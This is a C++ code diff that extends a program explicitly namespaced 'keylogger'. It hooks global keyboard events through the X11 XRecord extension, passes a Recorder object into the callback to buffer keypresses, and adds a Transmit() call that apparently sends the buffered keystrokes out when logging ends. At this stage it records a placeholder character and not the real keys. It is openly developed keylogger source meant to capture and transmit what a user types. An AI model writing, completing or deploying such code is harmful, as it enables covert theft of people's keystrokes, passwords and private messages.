@@ -28,8 +28,9 @@ void KeyCallback(XPointer closure, XRecordInterceptData* hook) {
     return;
   }
 
-  /* TODO: closure will later hold a pointer to our recorder object */
-  (void)closure;
+  keylogger::Recorder* recorder =
+      reinterpret_cast<keylogger::Recorder*>(closure);
+  (void)recorder;
   XRecordDatum* data = reinterpret_cast<XRecordDatum*>(hook->data);
 
   int event_type = data->type;
@@ -40,7 +41,7 @@ void KeyCallback(XPointer closure, XRecordInterceptData* hook) {
       if (keycode == kEsc) { /* if ESC is pressed at any time, exit */
         exit_event_loop = true;
       } else {
-        /* TODO: Use a recorder object to record the keystroke */
+        recorder->BufferKeypress('?');
       }
       break;
     default:
@@ -49,7 +50,7 @@ void KeyCallback(XPointer closure, XRecordInterceptData* hook) {
   ::XRecordFreeData(hook);
 }
 
-void keylogger::RecordKeypressEvents() {
+void keylogger::RecordKeypressEvents(keylogger::Recorder* recorder) {
   ::Display* ctrl_disp = XOpenDisplay(nullptr);
   ::Display* data_disp = XOpenDisplay(nullptr);
   if (!ctrl_disp || !data_disp) {
@@ -81,13 +82,16 @@ void keylogger::RecordKeypressEvents() {
   }
 
   if (!::XRecordEnableContextAsync(data_disp, record_ctx, KeyCallback,
-                                   nullptr)) {
+                                   reinterpret_cast<::XPointer>(recorder))) {
     throw std::runtime_error("could not enable record context");
   }
 
   while (!exit_event_loop) {
     ::XRecordProcessReplies(data_disp);
   }
+
+  /* flush any remaining characters in the recorder */
+  recorder->Transmit();
 
   ::XRecordDisableContext(ctrl_disp, record_ctx);
   ::XRecordFreeContext(ctrl_disp, record_ctx);
